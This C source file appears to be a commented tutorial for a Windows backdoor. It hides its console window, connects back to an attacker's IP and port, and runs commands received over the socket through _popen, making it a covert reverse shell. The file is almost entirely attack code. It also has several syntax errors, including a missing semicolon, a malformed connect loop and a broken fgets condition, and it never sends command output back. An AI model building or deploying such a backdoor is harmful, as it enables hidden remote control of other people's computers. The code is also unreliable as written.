//Windows Program Main Function File

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //to include all the .h header libraries
#include <winsock2.h> //for socket programming to establish connection with server
#include <windows.h> //to use windows specific programs
#include <winuser.h> //will be used to interact with the programs
#include <wininet.h> //will be used to interact with the programs
#include <windowsx.h> //will be used to interact with the programs
#include <string.h> //manipulate strings in the program
#include <sys/stat.h> //to get information about file attributes
#include <sys/types.h> //to interact with the files for various options

#define bzero(p, size) (void) memset((p), 0, (size)) //p is the parameter(buffer/container/total_response, size is the size of the param, 0 is the initial size we are allocating to the parameters
int sock; //a global variable

void Shell()
{
	char buffer[1024]; //to receive commands from the server sent by the attacker. Commands like deleting/copying a file etc. will be stored in this buffer.
	char container[1024]; //
	char total_response[18384]; //
	
	while (1) //iterates forever until a specific task is fullfilled
	{
		jump:
		//now allocating 0 to the values of the above 3 variables
		//we can use memset(windows fn) but we will use bzero(linux fn) which we have to define it in a windows machine
		bzero(buffer,1024); //either write the size of the fn this way
		bzero(container, sizeof(container)); //or write it using sizeof fn, which is a good practice of writing code
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0); //the first thing that the program will do is to receive commands from the server
		
		if (strncmp("q", buffer, 1) == 0){ //simply close the socket obj and exit the program
		//string compare takes 3 arguments in c
		// #1 The string that we are comparing.
		// #2 The variable that we are comparing the string with.
		// #3 How many characters are we comparing.
		
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else{ //if any other command then that is supposed to be run
			FILE *fp; //using File discriptors to point to a specific memory
			fp = _popen(buffer, "r") 
			//to open a file as a process
			//2 params - First, buffer to read the user entered command from; Second, is a string "r" which says Read the Buffer and execute it.
			while(fgets(container,1024,fp) != NULL{
			//no we also want a response from the computer to send it back to the server. Fgets will get the string from another variable to a different variable.
				strcat(total_response, container);
			}
		}
	}
}

//every windows program includes an entry point fn and APIENTRY to access different fns
int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdShow)
// #RULES
// #1 nCmdShow is an Anonymity flag that says if the Main Application will be maxi/minimized or shown normally, which is the first thing that is done in this function.
// #2 The value of a Handle to an instance/module is used by the OS to identify the executable file, when it's loaded in the memory.
// #3 lpCmdline contains CMD line arguments like a unicode string
// #4 hPrev was used in 16bit OSs and just used to be compatible with the windows API. Its value is 0.
{
	HWND stealth; //now the application window will NOT be visible to the target. Stealth variable is the Handle to our Window.
	AllocConsole(); //a fn that allocates a new console on the attacker's pc, to the calling process everytime the Application is executed.
	
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	//a function from winuser.h that retrieves a handle to the top level window.
	//this fn uses two arguments where first one is a classname and other is the window name which we defined to be NULL.
	
	ShowWindow(stealth,0); 
	//A fn that decides whether to show the window to the program or not.
	//uses two arguments- Handle instance ie. stealth, nCmdShow ie. 0 to hiding the window and activating another window.
	
	
	/* Below variables are created for Socket Connection Establishment */
	struct sockaddr_in ServAddr; //defining the actual server address
	unsigned short ServPort; //we're using these two variables cuz we require an IP Add and a port to connect to, from our backdoor.
	char *ServIP; //pointer pointing to the memory address of ServIP.
	WSADATA wsaData; 
	//a struct that contains info about the Windows sockets, is required to establish a socket connection to target windows machine.
	//WSADATA is a data structure used by the WSAStartup fn whose return type is an integer. 
	//WSAStartup fn specifies the version of Windows Sockets (winsock2.h) required and to set-up all the things that the application needs to use sockets.
	// https://stackoverflow.com/questions/4991967/how-does-wsastartup-function-initiates-use-of-the-winsock-dll
	
	ServIP = "192.168.1.15"; //the IP of the attacker's machine which will listen to the connections coming from the backdoor.
	ServPort = 50005; //random free port to listen to the connections.
	
	
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) //if successful it will return 0
	{
		exit(1); //exit the program straightaway if result != 0
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	//defining the socket object
	//AF_INET defines that the connection is established over IPv4
	//SOCK_STREAM defines that its a TCP conn or a 3-way-handshake conn to establish a connection b/w server and target
	
	/* Defining the parameters that the ServAddr will take, as it is a part of a structure sockaddr_in */
	memset(&ServAddr, 0, sizeof(ServAddr)); 
	//clears the variables with 0's
	// if ServAddr variable value is "42069" -> "00000"
	ServAddr.sin_family = AF_INET; //PARAMETER 1 ie. IPv4 conn
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //PARAMETER 2 ie. IP Addr of the server is accessed by inet_addr fn, as we can't use the string "192.168.1.15"
	ServAddr.sin_port = htons(ServPort); //PARAMETER 3 ie. to assign the value of the Port, using the htons fn, as we can't use the integer 50006
	
	/*performing a connection*/
	//Here, if the connection is setup the while loop wont run, else the loop will try to connect to the server after every 10s of sleep.
	start: //this start jump-point is called in the Void Shell function.
	while connect(sock,(struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)
	{
		Sleep(10);
		goto start;
	}
	Shell();	
}
